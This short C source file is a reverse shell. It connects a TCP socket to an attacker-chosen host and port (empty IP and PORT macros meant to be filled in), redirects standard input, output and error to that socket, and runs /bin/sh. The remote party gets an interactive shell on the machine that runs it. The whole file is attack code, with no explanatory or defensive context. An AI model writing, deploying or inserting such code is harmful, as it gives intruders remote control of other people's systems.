#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define IP
#define PORT

int main(int argc, char **argv)
{
    struct sockaddr_in serveraddr;
    int server_sockfd;
    int client_len;
    char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};

    server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = inet_addr(IP); 
    serveraddr.sin_port = htons(atoi(PORT));
    client_len = sizeof(serveraddr);

    connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);

    dup2(server_sockfd, 0);
    dup2(server_sockfd, 1);
    dup2(server_sockfd, 2);

    execve("/bin/sh",cmdBuf,0);
}
